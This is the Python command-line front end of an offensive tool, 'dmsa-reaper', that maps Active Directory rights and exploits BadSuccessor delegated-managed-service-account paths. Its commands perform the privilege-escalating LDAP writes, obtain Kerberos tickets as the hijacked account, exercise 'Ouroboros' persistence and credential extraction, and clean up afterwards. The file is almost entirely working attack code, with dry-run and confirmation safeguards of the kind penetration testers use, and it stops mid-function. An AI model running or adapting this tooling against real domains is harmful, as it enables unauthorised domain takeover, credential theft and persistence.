from __future__ import annotations

import json
import os
from pathlib import Path
from typing import Any, Optional

import typer
from rich import print
from rich.panel import Panel
from rich.table import Table

from dmsa_reaper import __version__
from dmsa_reaper.auth.ldap_bind import LdapAuthConfig, bind
from dmsa_reaper.constants import DEFAULT_SD_FLAGS
from dmsa_reaper.map.principal import get_current_principal
from dmsa_reaper.map.runner import run_live_map
from dmsa_reaper.models import MapState, Operation, PathCandidate
from dmsa_reaper.ops.cleanup import cleanup_operation
from dmsa_reaper.ops.operation_log import (
    configure_ops_dir,
    get_ops_dir,
    load_operation,
    save_operation,
)
from dmsa_reaper.ops.ticket import (
    TicketAcquisitionError,
    acquire_dmsa_tgt,
    acquire_dmsa_ticket,
)
from dmsa_reaper.ouroboros.checks import (
    active_ouroboros_findings,
    classify_ouroboros_paths,
)
from dmsa_reaper.ouroboros.credentials import secure_write_json
from dmsa_reaper.ouroboros.extract import (
    OuroborosExtractionError,
    extract_ouroboros_credentials,
)
from dmsa_reaper.output.console import print_paths
from dmsa_reaper.paths.classifier import classify_paths
from dmsa_reaper.paths.ranking import rank_paths
from dmsa_reaper.primitives.registry import get_primitives


app = typer.Typer(
    add_completion=False,
    context_settings={"help_option_names": ["-h", "--help"]},
    help="Find and exploit BadSuccessor paths in Active Directory.",
    no_args_is_help=True,
)
ouroboros_app = typer.Typer(
    add_completion=False,
    help="Assess and exercise dMSA Ouroboros persistence.",
    no_args_is_help=True,
)
app.add_typer(ouroboros_app, name="ouroboros")

_LEGACY_PRIMITIVES = frozenset({"legacy-oneway-link", "existing-dmsa-legacy-link"})
_CREATE_CHILD_RIGHTS = frozenset({"CreateChild", "CreateChild:dMSA", "GenericAll"})
_DACL_CONTROL_RIGHTS = frozenset({"WriteDACL", "GenericAll"})
_DMSA_MIGRATION_ATTR_RIGHTS = frozenset(
    {
        "WriteProperty:msDS-ManagedAccountPrecededByLink",
        "WriteProperty:msDS-DelegatedMSAState",
    }
)
_POSTPATCH_TARGET_ATTRS = frozenset(
    {
        "msDS-SupersededManagedAccountLink",
        "msDS-SupersededServiceAccountState",
    }
)


def _version_callback(value: bool) -> None:
    if value:
        typer.echo(f"dmsa-reaper {__version__}")
        raise typer.Exit()


@app.callback()
def main(
    version: bool = typer.Option(
        False,
        "--version",
        callback=_version_callback,
        is_eager=True,
        help="Show the version and exit.",
    ),
) -> None:
    del version


def _write_json(path: Path, payload: object) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(payload, indent=2, default=str) + "\n", encoding="utf-8")


def _has_dmsa_migration_rights(right_names: set[str]) -> bool:
    return (
        "GenericAll" in right_names
        or "GenericWrite" in right_names
        or _DMSA_MIGRATION_ATTR_RIGHTS.issubset(right_names)
    )


def _current_principal_sid(state: MapState) -> str:
    if state.current_principal is None or not state.current_principal.sid:
        raise typer.BadParameter(
            "state has no current principal; map again with authenticated credentials"
        )
    return state.current_principal.sid


def _require_container_right(
    state: MapState,
    container_dn: str,
    accepted_rights: frozenset[str],
    label: str,
) -> None:
    container = next(
        (item for item in state.containers if item.dn.lower() == container_dn.lower()),
        None,
    )
    if container is None:
        raise typer.BadParameter(
            f"container is absent from mapped state: {container_dn}. Run map again."
        )
    principal_sid = _current_principal_sid(state)
    if not any(
        right.principal_sid == principal_sid and right.right in accepted_rights
        for right in container.rights
    ):
        raise typer.BadParameter(
            f"mapped principal does not have {label} on container {container_dn}"
        )


def _require_dmsa_migration_right(state: MapState, dmsa_dn: str) -> None:
    dmsa = next(
        (item for item in state.dmsas if item.dn.lower() == dmsa_dn.lower()),
        None,
    )
    if dmsa is None:
        raise typer.BadParameter(f"dMSA is absent from mapped state: {dmsa_dn}")
    principal_sid = _current_principal_sid(state)
    rights = {
        right.right
        for right in dmsa.rights
        if right.principal_sid == principal_sid
    }
    if not _has_dmsa_migration_rights(rights):
        raise typer.BadParameter(
            f"mapped principal does not have dMSA migration rights on {dmsa_dn}"
        )


def _require_target_dacl_right(state: MapState, target_dn: str) -> None:
    target = next(
        (item for item in state.targets if item.dn.lower() == target_dn.lower()),
        None,
    )
    if target is None:
        raise typer.BadParameter(f"target is absent from mapped state: {target_dn}")
    principal_sid = _current_principal_sid(state)
    if not any(
        right.principal_sid == principal_sid and right.right in _DACL_CONTROL_RIGHTS
        for right in target.rights
    ):
        raise typer.BadParameter(
            f"mapped principal does not have WriteDACL/GenericAll on {target_dn}"
        )


def _writes_postpatch_target(
    primitive_name: str,
    chain: str | None,
) -> bool:
    return primitive_name in {
        "postpatch-mutual-pair",
        "existing-dmsa-postpatch-mutual",
        "ouroboros",
    } or (primitive_name == "dacl-container-escalate" and chain == "postpatch")


def _target_writable_attrs(
    state: MapState,
    target_dn: str | None,
    primitive_name: str,
    chain: str | None,
) -> list[str] | None:
    if not target_dn or not _writes_postpatch_target(primitive_name, chain):
        return None
    target = next(
        (item for item in state.targets if item.dn.lower() == target_dn.lower()),
        None,
    )
    if target is None:
        raise typer.BadParameter(
            f"postpatch target is absent from mapped state: {target_dn}"
        )
    missing = sorted(_POSTPATCH_TARGET_ATTRS - set(target.writable_attrs))
    if missing:
        raise typer.BadParameter(
            f"target lacks required WriteProperty rights: {', '.join(missing)}"
        )
    return target.writable_attrs


def _normalized_account(value: str) -> str:
    return value.split("\\")[-1].split("@")[0].rstrip("$").lower()


def _validate_execution_binding(
    *,
    conn: Any,
    state: MapState,
    username: str | None,
    kerberos: bool,
    dc_host: str | None,
    dc_ip: str | None,
) -> dict[str, str]:
    mapped_principal = state.current_principal
    if mapped_principal is None:
        raise typer.BadParameter(
            "confirmed execution requires an authenticated map with a current principal"
        )
    if not username:
        raise typer.BadParameter(
            "--username is required so execution uses the account mapped in state.json"
        )
    default_nc = state.environment.default_nc or ",".join(
        f"DC={label}"
        for label in (state.environment.domain or "").split(".")
        if label
    )
    if not default_nc:
        raise typer.BadParameter("mapped state has no default naming context")

    if kerberos:
        cache_name = os.environ.get("KRB5CCNAME", "")
        cache_path = (
            cache_name[5:]
            if cache_name.upper().startswith("FILE:")
            else cache_name
        )
        if not cache_path:
            raise typer.BadParameter(
                "KRB5CCNAME must point to a FILE ccache for Kerberos execution"
            )
        try:
            from impacket.krb5.ccache import CCache

            cache = CCache.loadFile(cache_path)
            principal = cache.principal.prettyPrint()
            cache_principal = (
                principal.decode("utf-8", errors="replace")
                if isinstance(principal, bytes)
                else str(principal)
            )
        except Exception as exc:
            raise typer.BadParameter(f"cannot read Kerberos ccache: {exc}") from exc
        if _normalized_account(cache_principal) != _normalized_account(username):
            raise typer.BadParameter(
                f"ccache principal {cache_principal!r} does not match --username"
            )

    live = get_current_principal(conn, default_nc, username)
    if live is None or not live.sid:
        raise typer.BadParameter(
            "execution credentials could not be resolved to an object SID"
        )
    if live.sid.lower() != mapped_principal.sid.lower():
        raise typer.BadParameter(
            f"execution SID {live.sid} does not match mapped SID {mapped_principal.sid}"
        )

    mapped_host = state.environment.mapped_dc_host
    mapped_ip = state.environment.mapped_dc_ip
    if mapped_host and (not dc_host or dc_host.lower() != mapped_host.lower()):
        raise typer.BadParameter(
            f"execution DC host {dc_host!r} does not match mapped DC host {mapped_host!r}"
        )
    if mapped_ip and dc_ip != mapped_ip:
        raise typer.BadParameter(
            f"execution DC IP {dc_ip!r} does not match mapped DC IP {mapped_ip!r}"
        )
    return {"sid": live.sid, "name": live.name or username}


def _revalidate_mapped_guids(
    *,
    conn: Any,
    state: MapState,
    dns: list[str | None],
) -> dict[str, str]:
    from dmsa_reaper.primitives._ldap_helpers import read_object_guid

    objects: list[Any] = [*state.containers, *state.targets, *state.dmsas]
    by_dn = {item.dn.lower(): item for item in objects}
    checked: dict[str, str] = {}
    for dn in dict.fromkeys(value for value in dns if value):
        mapped = by_dn.get(dn.lower())
        if mapped is None or not mapped.object_guid:
            continue
        live_guid = read_object_guid(conn, dn)
        if live_guid.lower() != mapped.object_guid.lower():
            raise typer.BadParameter(
                f"object changed since mapping: {dn} "
                f"(mapped {mapped.object_guid}, live {live_guid})"
            )
        checked[dn] = live_guid
    return checked


def _make_ldap_config(
    domain: str,
    dc_ip: str | None,
    dc_host: str | None,
    username: str | None,
    password: str | None,
    kerberos: bool,
    use_ldaps: bool,
    start_tls: bool,
) -> LdapAuthConfig:
    return LdapAuthConfig(
        domain=domain,
        dc_ip=dc_ip,
        dc_host=dc_host,
        username=username,
        password=password,
        kerberos=kerberos,
        use_ldaps=use_ldaps,
        start_tls=start_tls,
    )


def _exact_target_filter(target: str) -> str:
    """Build an LDAP filter that matches exactly one account by SID, DN, or sAMAccountName."""
    from ldap3.utils.conv import escape_filter_chars

    escaped = escape_filter_chars(target)
    if target.upper().startswith("S-1-"):
        return f"(objectSid={escaped})"
    if "," in target and "=" in target:
        return f"(distinguishedName={escaped})"
    return f"(sAMAccountName={escaped})"


def _apply_legacy_filter(
    paths: list[PathCandidate],
    state: MapState,
    *,
    legacy: bool,
) -> list[PathCandidate]:
    """Drop pre-patch/indirect paths unless --legacy is set, matching 'paths' defaults."""
    if legacy:
        return paths
    has_postpatch_target = any(
        _POSTPATCH_TARGET_ATTRS.issubset(set(target.writable_attrs))
        for target in state.targets
    )
    return [
        path
        for path in paths
        if path.primitive not in _LEGACY_PRIMITIVES
        and (path.primitive != "dacl-container-escalate" or has_postpatch_target)
    ]


def _select_path(state: MapState, path_id: str) -> PathCandidate:
    paths = rank_paths(classify_paths(state, expand_targets=True))
    selected = next((path for path in paths if path.id == path_id), None)
    if selected is None:
        raise typer.BadParameter(
            f"path not found: {path_id}. Run 'dmsa-reaper paths --state ...' again."
        )
    return selected


def _populate_operation(
    operation: Operation,
    *,
    state: MapState,
    target_dn: str | None,
    container_dn: str | None,
    chain: str | None,
    dmsa_name: str | None,
    target_writable_attrs: list[str] | None,
    allow_broad_dacl: bool,
    dc_host: str | None,
    dc_ip: str | None,
) -> None:
    selected_path = operation.metadata.get("path")
    if not isinstance(selected_path, dict):
        selected_path = {}
    if target_dn:
        operation.metadata["target_dn"] = target_dn
    if container_dn:
        operation.metadata["container_dn"] = container_dn
    if chain:
        operation.metadata["chain"] = chain
    if dmsa_name:
        operation.metadata["dmsa_name"] = dmsa_name
    if target_writable_attrs is not None:
        operation.metadata["target_writable_attrs"] = target_writable_attrs
    if allow_broad_dacl:
        operation.metadata["allow_broad_dacl"] = True
    if operation.primitive == "existing-dmsa-legacy-link":
        operation.metadata["allow_existing_dmsa_legacy_link"] = True

    if state.current_principal:
        operation.metadata["principal_sid"] = state.current_principal.sid
    if state.schema_cache.attr_guids:
        operation.metadata["attr_guids"] = state.schema_cache.attr_guids
    if state.schema_cache.dmsa_class_guid:
        operation.metadata["dmsa_class_guid"] = state.schema_cache.dmsa_class_guid

    dmsa_dn = selected_path.get("dmsa_dn")
    if dmsa_dn:
        operation.metadata.setdefault("dmsa_dn", dmsa_dn)
        mapped_dmsa = next(
            (
                item
                for item in state.dmsas
                if item.dn.lower() == str(dmsa_dn).lower()
            ),
            None,
        )
        if mapped_dmsa and mapped_dmsa.sam:
            operation.metadata["dmsa_sam"] = mapped_dmsa.sam

    domain = state.environment.domain
    if domain:
        operation.metadata["domain"] = domain.lower()
        operation.metadata["realm"] = domain.upper()
    operation.metadata["dc_host"] = dc_host
    operation.metadata["dc_ip"] = dc_ip


def _print_exploit_result(operation: Operation) -> None:
    metadata = operation.metadata
    path = metadata.get("path")
    path = path if isinstance(path, dict) else {}
    created_dn = metadata.get("created_dmsa_dn")
    created_sam = metadata.get("created_dmsa_sam")
    dmsa_dn = metadata.get("dmsa_dn") or path.get("dmsa_dn")
    dmsa_sam = metadata.get("dmsa_sam")
    target = metadata.get("target_dn") or path.get("target_dn")

    lines: list[str] = []
    if created_dn:
        lines.append(f"[bold]dMSA DN[/bold]  {created_dn}")
    elif dmsa_dn:
        lines.append(f"[bold]dMSA DN[/bold]  {dmsa_dn}")
    if created_sam or dmsa_sam:
        lines.append(f"[bold]dMSA SAM[/bold] {created_sam or dmsa_sam}")
    if target:
        lines.append(f"[bold]Target[/bold]   {target}")
    lines.extend(
        [
            "",
            f"Get the dMSA TGT: dmsa-reaper tgt --op {operation.id} "
            "--ccache <operator.ccache> --identity <operator>",
            f"Cleanup: dmsa-reaper cleanup --op {operation.id}",
        ]
    )
    print(
        Panel(
            "\n".join(lines),
            title="[green]exploit complete[/green]",
            subtitle=f"operation {operation.id}",
            expand=False,
        )
    )


_OPT_DC_IP = typer.Option(None, "--dc-ip", help="Domain controller IP.")
_OPT_DC_HOST = typer.Option(None, "--dc-host", help="Domain controller hostname.")
_OPT_USER = typer.Option(None, "--username", "-u", help="Username.")
_OPT_PASS = typer.Option(None, "--password", "-p", help="Password.")
_OPT_KRB = typer.Option(False, "--kerberos", "-k", help="Use KRB5CCNAME.")
_OPT_LDAPS = typer.Option(False, "--use-ldaps", help="Use LDAPS on port 636.")
_OPT_STARTTLS = typer.Option(False, "--start-tls", help="Use STARTTLS on port 389.")


@app.command("map")
def map_cmd(
    domain: str = typer.Option(..., "--domain", "-d", help="Target domain FQDN."),
    dc_ip: Optional[str] = _OPT_DC_IP,
    dc_host: Optional[str] = _OPT_DC_HOST,
    username: Optional[str] = _OPT_USER,
    password: Optional[str] = _OPT_PASS,
    kerberos: bool = _OPT_KRB,
    use_ldaps: bool = _OPT_LDAPS,
    start_tls: bool = _OPT_STARTTLS,
    target: Optional[str] = typer.Option(
        None,
        "--target",
        help="Limit targets to one sAMAccountName, SID, or DN.",
    ),
    target_filter: Optional[str] = typer.Option(
        None,
        "--target-filter",
        help="Additional LDAP filter for target accounts.",
    ),
    container_filter: Optional[str] = typer.Option(
        None,
        "--container-filter",
        help="Additional LDAP filter for containers.",
    ),
    max_targets: Optional[int] = typer.Option(
        None,
        "--max-targets",
        help="Maximum target accounts to enumerate.",
    ),
    only_current_principal: bool = typer.Option(
        False,
        "--only-current-principal",
        help="Enumerate only the authenticated account as a target.",
    ),
    json_out: Path = typer.Option(Path("state.json"), "--json", help="State output."),
) -> None:
    """Map dMSAs, candidate targets, containers, and effective rights."""
    if kerberos and not username:
        raise typer.BadParameter(
            "Kerberos mapping requires --username for SID and group resolution"
        )
    if target:
        exact_filter = _exact_target_filter(target)
        target_filter = (
            f"(&{target_filter}{exact_filter})"
            if target_filter
            else exact_filter
        )

    state = run_live_map(
        _make_ldap_config(
            domain,
            dc_ip,
            dc_host,
            username,
            password,
            kerberos,
            use_ldaps,
            start_tls,
        ),
        sdflags=DEFAULT_SD_FLAGS,
        target_filter=target_filter,
        container_filter=container_filter,
        max_targets=max_targets,
        only_current_principal=only_current_principal,
    )
    state.save(json_out)
    print(f"[green][+] State written:[/green] {json_out}")
    print(
        f"[*] dMSAs={len(state.dmsas)} "
        f"containers={len(state.containers)} targets={len(state.targets)}"
    )


@app.command("paths")
def paths_cmd(
    state_path: Path = typer.Option(
        Path("state.json"),
        "--state",
        help="Map state produced by the map command.",
    ),
    only: Optional[list[str]] = typer.Option(
        None,
        "--only",
        help="Show only this primitive; repeat for multiple primitives.",
    ),
    legacy: bool = typer.Option(
        False,
        "--legacy",
        help="Include pre-patch one-way-link paths.",
    ),
    json_out: Optional[Path] = typer.Option(
        None,
        "--json",
        help="Write paths as JSON.",
    ),
) -> None:
    """List ranked, executable BadSuccessor paths."""
    state = MapState.load(state_path)
    paths = rank_paths(classify_paths(state, expand_targets=True))
    paths = _apply_legacy_filter(paths, state, legacy=legacy)
    if only:
        wanted = set(only)
        paths = [path for path in paths if path.primitive in wanted]
    if json_out:
        _write_json(
            json_out,
            [path.model_dump(mode="json") for path in paths],
        )
        print(f"[green][+] Paths written:[/green] {json_out}")
    print_paths(paths)


@app.command("exploit")
def exploit_cmd(
    target: Optional[str] = typer.Option(
        None,
        "--target",
        help="Account to attack: sAMAccountName, SID, or DN. Maps and selects "
        "live, without a separate map/paths step.",
    ),
    path_id: Optional[str] = typer.Option(
        None,
        "--path",
        help="Path ID. Required with --state; with --target, narrows a "
        "multi-candidate result.",
    ),
    state_path: Optional[Path] = typer.Option(
        None,
        "--state",
        help="Map state produced by the map command (used without --target).",
    ),
    primitive_filter: Optional[str] = typer.Option(
        None,
        "--primitive",
        help="With --target, restrict discovery to one primitive.",
    ),
    legacy: bool = typer.Option(
        False,
        "--legacy",
        help="With --target, also consider pre-patch one-way-link paths.",
    ),
    confirm: bool = typer.Option(
        False,
        "--confirm",
        help="Perform the LDAP writes.",
    ),
    dry_run: bool = typer.Option(
        False,
        "--dry-run",
        help="Print the planned LDAP writes.",
    ),
    domain: Optional[str] = typer.Option(None, "--domain", "-d"),
    dc_ip: Optional[str] = _OPT_DC_IP,
    dc_host: Optional[str] = _OPT_DC_HOST,
    username: Optional[str] = _OPT_USER,
    password: Optional[str] = _OPT_PASS,
    kerberos: bool = _OPT_KRB,
    use_ldaps: bool = _OPT_LDAPS,
    start_tls: bool = _OPT_STARTTLS,
    target_dn: Optional[str] = typer.Option(
        None,
        "--target-dn",
        help="Target account DN override for a path that requires one.",
    ),
    container_dn: Optional[str] = typer.Option(
        None,
        "--container-dn",
        help="Container for dMSA creation, or to disambiguate a --target search.",
    ),
    chain: Optional[str] = typer.Option(
        None,
        "--chain",
        help="dacl-container chain: postpatch or legacy.",
    ),
    dmsa_name: Optional[str] = typer.Option(
        None,
        "--dmsa-name",
        help="CN prefix for a newly created dMSA.",
    ),
    allow_broad_dacl: bool = typer.Option(
        False,
        "--allow-broad-dacl",
        help="Use broad ACEs when schema GUIDs are unavailable.",
    ),
    cleanup_policy: str = typer.Option(
        "on-failure",
        "--cleanup-policy",
        help="Partial-failure cleanup: on-failure or manual.",
    ),
    ops_dir: Optional[Path] = typer.Option(None, "--ops-dir"),
    json_out: Optional[Path] = typer.Option(None, "--json"),
) -> None:
    """Preview or execute one path.

    Use --target to map and exploit a single account directly. Use
    --state/--path after a separate 'map' + 'paths' run.
    """
    if confirm == dry_run:
        raise typer.BadParameter("choose exactly one of --confirm or --dry-run")
    if cleanup_policy not in {"on-failure", "manual"}:
        raise typer.BadParameter("--cleanup-policy must be on-failure or manual")
    if target and state_path:
        raise typer.BadParameter("choose --target or --state, not both")
    if not target and not path_id:
        raise typer.BadParameter("--path is required unless --target is given")

    configure_ops_dir(ops_dir)
    direct_target_dn: str | None = None

    if target:
        effective_domain = domain or ""
        if not effective_domain and not dc_ip and not dc_host:
            raise typer.BadParameter("--domain, --dc-ip, or --dc-host is required")
        state = run_live_map(
            _make_ldap_config(
                effective_domain,
                dc_ip,
                dc_host,
                username,
                password,
                kerberos,
                use_ldaps,
                start_tls,
            ),
            sdflags=DEFAULT_SD_FLAGS,
            target_filter=_exact_target_filter(target),
        )
        if not state.targets:
            raise typer.BadParameter(f"target not found: {target}")
        direct_target_dn = state.targets[0].dn

        candidates = [p for p in rank_paths(classify_paths(state, expand_targets=True)) if p.executable]
        candidates = _apply_legacy_filter(candidates, state, legacy=legacy)
        if primitive_filter:
            candidates = [p for p in candidates if p.primitive == primitive_filter]
        if container_dn:
            candidates = [
                p for p in candidates if (p.container_dn or "").lower() == container_dn.lower()
            ]
        if path_id:
            candidates = [p for p in candidates if p.id == path_id]

        if len(candidates) != 1:
            print_paths(candidates)
            if not candidates:
                raise typer.BadParameter(f"no executable path found for target {target!r}")
            raise typer.BadParameter(
                f"{len(candidates)} executable paths found for {target!r}; "
                "narrow with --path, --primitive, or --container-dn"
            )
        selected = candidates[0]
    else:
        state = MapState.load(state_path or Path("state.json"))
        selected = _select_path(state, path_id)
        if not selected.executable:
            raise typer.BadParameter(f"path is not executable: {path_id}")

    primitive = get_primitives().get(selected.primitive)
    if primitive is None or not primitive.check(selected):
        raise typer.BadParameter(
            f"no executor is available for {selected.primitive}"
        )

    effective_target = target_dn or selected.target_dn or direct_target_dn
    effective_container = container_dn or selected.container_dn
    if selected.requires_operator_target and not effective_target:
        raise typer.BadParameter("--target-dn is required for this path")
    if primitive.name == "dacl-target-escalate" and not effective_container:
        raise typer.BadParameter("--container-dn is required for this path")
    if primitive.name == "dacl-container-escalate":
        if chain not in {"postpatch", "legacy"}:
            raise typer.BadParameter(
                "--chain postpatch or --chain legacy is required for this path"
            )
    elif chain is not None:
        raise typer.BadParameter("--chain is only valid for dacl-container-escalate")

    writable_attrs = _target_writable_attrs(
        state,
        effective_target,
        primitive.name,
        chain,
    )

    if confirm:
        if primitive.name in {"postpatch-mutual-pair", "legacy-oneway-link"}:
            if not effective_container:
                raise typer.BadParameter("selected path has no container DN")
            _require_container_right(
                state,
                effective_container,
                _CREATE_CHILD_RIGHTS,
                "CreateChild:dMSA",
            )
        elif primitive.name in {
            "existing-dmsa-postpatch-mutual",
            "existing-dmsa-legacy-link",
        }:
            if not selected.dmsa_dn:
                raise typer.BadParameter("selected path has no dMSA DN")
            _require_dmsa_migration_right(state, selected.dmsa_dn)
        elif primitive.name == "dacl-container-escalate":
            if not effective_container:
                raise typer.BadParameter("selected path has no container DN")
            _require_container_right(
                state,
                effective_container,
                _DACL_CONTROL_RIGHTS,
                "WriteDACL/GenericAll",
            )
        elif primitive.name == "dacl-target-escalate":
            if not effective_container or not effective_target:
                raise typer.BadParameter(
                    "dacl-target-escalate needs target and container DNs"
                )
            _require_container_right(
                state,
                effective_container,
                _CREATE_CHILD_RIGHTS,
                "CreateChild:dMSA",
            )
            _require_target_dacl_right(state, effective_target)

    try:
        warnings = [
            *selected.environment_warnings,
            *primitive.preflight(
                selected,
                target_dn=effective_target,
                container_dn=effective_container,
            ),
        ]
    except Exception as exc:
        raise typer.BadParameter(f"preflight failed: {exc}") from exc
    for warning in dict.fromkeys(warnings):
        print(f"[yellow][!] {warning}[/yellow]")

    if dry_run:
        preview = Operation(
            id="DRY-RUN",
            primitive=selected.primitive,
            path_id=selected.id,
            metadata={"path": selected.model_dump(mode="json")},
        )
        _populate_operation(
            preview,
            state=state,
            target_dn=effective_target,
            container_dn=effective_container,
            chain=chain,
            dmsa_name=dmsa_name,
            target_writable_attrs=writable_attrs,
            allow_broad_dacl=allow_broad_dacl,
            dc_host=dc_host,
            dc_ip=dc_ip,
        )
        steps = primitive.dry_run_steps(preview)
        if json_out:
            _write_json(
                json_out,
                {
                    "operation": preview.model_dump(mode="json"),
                    "steps": steps,
                    "ldap_writes_performed": False,
                },
            )
        print(
            Panel(
                "\n".join(steps),
                title=f"[yellow]dry run[/yellow] {selected.primitive}",
                subtitle="No LDAP writes were made",
                expand=False,
            )
        )
        return

    effective_domain = domain or state.environment.domain
    if not effective_domain and not dc_ip and not dc_host:
        raise typer.BadParameter("--domain, --dc-ip, or --dc-host is required")
    conn = bind(
        _make_ldap_config(
            effective_domain or "",
            dc_ip,
            dc_host,
            username,
            password,
            kerberos,
            use_ldaps,
            start_tls,
        )
    )
    execution_identity = _validate_execution_binding(
        conn=conn,
        state=state,
        username=username,
        kerberos=kerberos,
        dc_host=dc_host,
        dc_ip=dc_ip,
    )
    validated_guids = _revalidate_mapped_guids(
        conn=conn,
        state=state,
        dns=[effective_container, effective_target, selected.dmsa_dn],
    )

    operation = primitive.plan(selected)
    _populate_operation(
        operation,
        state=state,
        target_dn=effective_target,
        container_dn=effective_container,
        chain=chain,
        dmsa_name=dmsa_name,
        target_writable_attrs=writable_attrs,
        allow_broad_dacl=allow_broad_dacl,
        dc_host=dc_host,
        dc_ip=dc_ip,
    )
    operation.metadata["execution_identity"] = execution_identity
    operation.metadata["validated_object_guids"] = validated_guids
    save_operation(operation)
    print(f"[*] Operation: {operation.id}")

    try:
        operation = primitive.execute(operation, confirm=True, conn=conn)
    except Exception:
        if cleanup_policy == "on-failure":
            operation = cleanup_operation(operation, conn=conn)
            save_operation(operation)
            print(
                f"[yellow][!] Automatic cleanup status: {operation.status}[/yellow]"
            )
        raise

    save_operation(operation)
    if json_out:
        _write_json(json_out, operation.model_dump(mode="json"))
        print(f"[green][+] Operation written:[/green] {json_out}")
    print(f"[green][+] Status:[/green] {operation.status}")
    _print_exploit_result(operation)


@app.command("tgt")
def tgt_cmd(
    op_id: str = typer.Option(..., "--op", help="Executed operation ID."),
    source_ccache: Path = typer.Option(
        ...,
        "--ccache",
        help="Operator TGT ccache used for the dMSA exchange.",
    ),
    identity: str = typer.Option(
        ...,
        "--identity",
        help="Operator account represented by the source ccache.",
    ),
    domain: Optional[str] = typer.Option(None, "--domain", "-d"),
    dc_ip: Optional[str] = typer.Option(None, "--dc-ip"),
    runs_dir: Optional[Path] = typer.Option(None, "--runs-dir"),
    ops_dir: Optional[Path] = typer.Option(None, "--ops-dir"),
    json_out: Optional[Path] = typer.Option(None, "--json"),
) -> None:
    """Acquire and save a TGT for the operation's dMSA."""
    configure_ops_dir(ops_dir)
    operation = load_operation(op_id)
    effective_domain = domain or operation.metadata.get("domain")
    if not effective_domain:
        raise typer.BadParameter("--domain is required")
    effective_dc_ip = dc_ip or operation.metadata.get("dc_ip")
    effective_runs_dir = runs_dir or (get_ops_dir().parent / "runs")
    try:
        result = acquire_dmsa_tgt(
            operation,
            source_ccache=source_ccache,
            identity=identity,
            domain=str(effective_domain),
            dc_ip=effective_dc_ip,
            runs_dir=effective_runs_dir,
        )
    except TicketAcquisitionError as exc:
        operation.metadata["tgt"] = {"status": "failed", "reason": str(exc)}
        save_operation(operation)
        raise typer.BadParameter(str(exc)) from exc
    operation.metadata["tgt"] = result
    save_operation(operation)
    if json_out:
        _write_json(json_out, result)
    print("[green][+] dMSA TGT acquired[/green]")
    print(f"[*] Cache: {result['tgt_ccache']}")
    print(f"[*] Client: {result['client']}")
    print(f"export KRB5CCNAME={result['tgt_ccache']}")


@app.command("ticket")
def ticket_cmd(
    op_id: str = typer.Option(..., "--op", help="Executed operation ID."),
    source_ccache: Path = typer.Option(
        ...,
        "--ccache",
        help="Operator TGT ccache used for the dMSA exchange.",
    ),
    identity: str = typer.Option(
        ...,
        "--identity",
        help="Operator account represented by the source ccache.",
    ),
    service: Optional[str] = typer.Option(
        None,
        "--service",
        "--spn",
        help="Service SPN, for example cifs/dc01.corp.local.",
    ),
    domain: Optional[str] = typer.Option(None, "--domain", "-d"),
    dc_host: Optional[str] = typer.Option(None, "--dc-host"),
    dc_ip: Optional[str] = typer.Option(None, "--dc-ip"),
    runs_dir: Optional[Path] = typer.Option(None, "--runs-dir"),
    ops_dir: Optional[Path] = typer.Option(None, "--ops-dir"),
    json_out: Optional[Path] = typer.Option(None, "--json"),
) -> None:
    """Acquire a dMSA TGT and a service ticket."""
    configure_ops_dir(ops_dir)
    operation = load_operation(op_id)
    effective_domain = domain or operation.metadata.get("domain")
    if not effective_domain:
        raise typer.BadParameter("--domain is required")
    effective_dc_host = dc_host or operation.metadata.get("dc_host")
    effective_dc_ip = dc_ip or operation.metadata.get("dc_ip")
    effective_service = service or (
        f"cifs/{effective_dc_host}" if effective_dc_host else None
    )
    if not effective_service:
        raise typer.BadParameter("--service/--spn or --dc-host is required")
    effective_runs_dir = runs_dir or (get_ops_dir().parent / "runs")
    try:
        result = acquire_dmsa_ticket(
            operation,
            source_ccache=source_ccache,
            identity=identity,
            domain=str(effective_domain),
            service=effective_service,
            dc_ip=effective_dc_ip,
            runs_dir=effective_runs_dir,
        )
    except TicketAcquisitionError as exc:
        operation.metadata["ticket"] = {
            "status": "failed",
            "reason": str(exc),
        }
        save_operation(operation)
        raise typer.BadParameter(str(exc)) from exc
    operation.metadata["ticket"] = result
    save_operation(operation)
    if json_out:
        _write_json(json_out, result)
    print("[green][+] Service ticket acquired[/green]")
    print(f"[*] dMSA TGT: {result['tgt_ccache']}")
    print(f"[*] Service cache: {result['service_ccache']}")
    print(f"[*] Client: {result['client']}")
    print(f"export KRB5CCNAME={result['service_ccache']}")
    print(f"[*] Handoff: {result['use_script']}")


@app.command("cleanup")
def cleanup_cmd(
    op_id: str = typer.Option(..., "--op", help="Operation ID to clean up."),
    domain: Optional[str] = typer.Option(None, "--domain", "-d"),
    dc_ip: Optional[str] = _OPT_DC_IP,
    dc_host: Optional[str] = _OPT_DC_HOST,
    username: Optional[str] = _OPT_USER,
    password: Optional[str] = _OPT_PASS,
    kerberos: bool = _OPT_KRB,
    use_ldaps: bool = _OPT_LDAPS,
    start_tls: bool = _OPT_STARTTLS,
    ops_dir: Optional[Path] = typer.Option(None, "--ops-dir"),
    json_out: Optional[Path] = typer.Option(None, "--json"),
) -> None:
    """Restore attributes and remove objects created by an operation."""
    configure_ops_dir(ops_dir)
    operation = load_operation(op_id)
    if not (operation.cleaned_up and operation.cleanup_verified):
        effective_domain = domain or operation.metadata.get("domain") or ""
        effective_dc_ip = dc_ip or operation.metadata.get("dc_ip")
        effective_dc_host = dc_host or operation.metadata.get("dc_host")
        if not effective_domain and not effective_dc_ip and not effective_dc_host:
            raise typer.BadParameter("--domain, --dc-ip, or --dc-host is required")
        conn = bind(
            _make_ldap_config(
                str(effective_domain),
                effective_dc_ip,
                effective_dc_host,
                username,
                password,
                kerberos,
                use_ldaps,
                start_tls,
            )
        )
        operation = cleanup_operation(operation, conn=conn)
        save_operation(operation)

    payload = {
        "operation_id": operation.id,
        "status": operation.status,
        "cleanup_verified": operation.cleanup_verified,
        "cleanup": operation.metadata.get("cleanup"),
    }
    cleanup_artifact = get_ops_dir().parent / "runs" / operation.id / "cleanup.json"
    _write_json(cleanup_artifact, payload)
    cleanup_artifact.chmod(0o600)
    if json_out:
        _write_json(json_out, payload)
    cleanup = operation.metadata.get("cleanup") or {}
    for conflict in cleanup.get("conflicts", []):
        print(f"[red][-] {conflict.get('dn')}: {conflict.get('reason')}[/red]")
    for error in cleanup.get("errors", []):
        print(f"[red][-] {error.get('dn')}: {error.get('reason')}[/red]")
    print(
        f"[green][+] Cleanup:[/green] {operation.status} "
        f"(checked={str(operation.cleanup_verified).lower()})"
    )
    if not operation.cleanup_verified:
